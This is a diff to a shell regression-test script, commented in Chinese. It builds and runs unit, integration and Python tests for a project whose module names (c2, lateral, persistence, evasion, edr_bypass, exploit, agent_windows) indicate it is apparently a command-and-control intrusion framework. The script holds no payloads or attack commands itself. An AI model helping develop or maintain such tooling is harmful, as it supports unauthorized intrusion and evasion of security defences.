@@ -1,45 +1,85 @@
 #!/bin/sh
 # dayanjing 全模块回归
+# 覆盖：C 模块单测 + 跨模块集成 + Python 侧
+# 每一步都套 timeout，任何一个卡住都不拖垮整体
 set -u
 ROOT=$(cd "$(dirname "$0")/.." && pwd)
 failed=0
-run() {
-    d="$ROOT/$1"; shift
-    [ -d "$d" ] || { echo "=== $1 === SKIP(目录不存在)"; return; }
-    printf "=== %-16s " "$1"
-    if (cd "$d" && timeout 300 make clean >/dev/null 2>&1; timeout 600 make >/tmp/mk_$1.log 2>&1); then
-        :
-    else
-        echo "BUILD FAIL"; failed=$((failed+1)); return
+passed=0
+
+# C 模块：编译后跑 build/ 下所有可执行测试
+# 注意 build/linux/ 这类子目录也要扫到（agent_windows）
+run_c() {
+    d="$ROOT/$1"
+    name="$1"
+    [ -d "$d" ] || { printf "=== %-16s SKIP(目录不存在)\n" "$name"; return; }
+    printf "=== %-16s " "$name"
+    if ! (cd "$d" && timeout 300 make >/tmp/mk_$name.log 2>&1); then
+        echo "BUILD FAIL"
+        tail -5 /tmp/mk_$name.log
+        failed=$((failed+1)); return
     fi
     ok=1
-    for t in "$d"/build/test_*; do
-        case "$t" in *.c|*.o) continue;; esac
-        [ -x "$t" ] || continue
-        timeout 120 "$t" >/tmp/t_$1.log 2>&1 || { ok=0; echo "FAIL"; echo "--- $t ---"; tail -5 /tmp/t_$1.log; }
+    # 只取可执行文件，排除 .c/.o（.o 也会被 -perm -u+x 误匹配）
+    for t in $(find "$d/build" -type f -name 'test_*' ! -name '*.c' ! -name '*.o' -perm -u+x 2>/dev/null | sort); do
+        if ! timeout 120 "$t" >/tmp/t_$name.log 2>&1; then
+            ok=0
+            echo "FAIL -> $t"
+            tail -6 /tmp/t_$name.log
+            break
+        fi
     done
-    [ $ok -eq 1 ] && echo "PASS"
-    [ $ok -eq 1 ] || failed=$((failed+1))
+    if [ $ok -eq 1 ]; then echo "PASS"; passed=$((passed+1)); else failed=$((failed+1)); fi
 }
+
+# 跨模块集成：单独编译并运行
+run_int() {
+    name="$1"; shift
+    printf "=== %-16s " "$name"
+    # 源路径是相对 ROOT 的，必须先 cd，否则找不到 tests/*.c
+    if (cd "$ROOT" && timeout 120 cc -std=c11 -O2 -Wall -Wextra -Wpedantic "$@" >/tmp/cc_$name.log 2>&1) \
+       && timeout 120 /tmp/bin_$name >/tmp/t_$name.log 2>&1; then
+        echo "PASS"; passed=$((passed+1))
+    else
+        echo "FAIL"
+        tail -6 /tmp/cc_$name.log /tmp/t_$name.log 2>/dev/null
+        failed=$((failed+1))
+    fi
+}
+
+# Python 侧
+run_py() {
+    printf "=== %-16s " "$1"
+    if timeout 180 python3 "$ROOT/$2" >/tmp/py_$1.log 2>&1; then
+        echo "PASS  $(tail -1 /tmp/py_$1.log)"; passed=$((passed+1))
+    else
+        echo "FAIL"; tail -6 /tmp/py_$1.log; failed=$((failed+1))
+    fi
+}
+
 for m in 00_crypto 01_proto 02_c2 03_transport 04_agent 05_server 06_db 07_ui \
-         08_lateral 09_persistence 10_evasion 11_edr_bypass 12_exploit agent_windows; do
-    run "$m" "$m"
+         08_lateral 09_persistence 10_evasion 11_edr_bypass 12_exploit \
+         14_p2p agent_windows; do
+    run_c "$m"
 done
-# 跨模块集成
-printf "=== %-16s " "integration"
-if cc -std=c11 -O2 -Wall -Wextra -Wpedantic -I03_transport/include -I10_evasion/include \
-      -I06_db/include -I07_ui/include tests/integration.c -o /tmp/integration \
-      03_transport/build/*.o 10_evasion/build/*.o 06_db/build/*.o 07_ui/build/*.o 2>/dev/null \
-   && timeout 60 /tmp/integration >/tmp/t_int.log 2>&1; then echo "PASS"; else echo "FAIL"; tail -5 /tmp/t_int.log; failed=$((failed+1)); fi
-printf "=== %-16s " "e2e_camo"
-if cc -std=c11 -O2 -Wall -Wextra -Wpedantic -I03_transport/include -I10_evasion/include \
-      tests/e2e_camo.c -o /tmp/e2e 03_transport/build/*.o 10_evasion/build/*.o 2>/dev/null \
-   && timeout 60 /tmp/e2e >/tmp/t_e2e.log 2>&1; then echo "PASS"; else echo "FAIL"; tail -5 /tmp/t_e2e.log; failed=$((failed+1)); fi
-printf "=== %-16s " "proto_c2_layer"
-if cc -std=c11 -O2 -Wall -Wextra -Wpedantic -I01_proto/include -I02_c2/include \
-      tests/proto_c2_layering.c -o /tmp/layering \
-      01_proto/build/frame.o 02_c2/build/c2_frame.o 02_c2/build/c2.o \
-      02_c2/build/crypto_gcm.o 02_c2/build/crypto_hash.o 2>/dev/null \
-   && timeout 60 /tmp/layering >/tmp/t_lay.log 2>&1; then echo "PASS"; else echo "FAIL"; tail -5 /tmp/t_lay.log; failed=$((failed+1)); fi
-echo "-------- failed: $failed --------"
+
+run_int integration \
+    -I03_transport/include -I10_evasion/include -I06_db/include -I07_ui/include \
+    -o /tmp/bin_integration tests/integration.c \
+    03_transport/build/*.o 10_evasion/build/*.o 06_db/build/*.o 07_ui/build/*.o
+
+run_int e2e_camo \
+    -I03_transport/include -I10_evasion/include \
+    -o /tmp/bin_e2e_camo tests/e2e_camo.c \
+    03_transport/build/*.o 10_evasion/build/*.o
+
+run_int proto_c2_layer \
+    -I01_proto/include -I02_c2/include \
+    -o /tmp/bin_proto_c2_layer tests/proto_c2_layering.c \
+    01_proto/build/frame.o 02_c2/build/c2_frame.o 02_c2/build/c2.o \
+    02_c2/build/crypto_gcm.o 02_c2/build/crypto_hash.o
+
+run_py 13_c2_server_py 13_c2_server/tests/test_server.py
+
+echo "-------- passed: $passed  failed: $failed --------"
 exit $failed
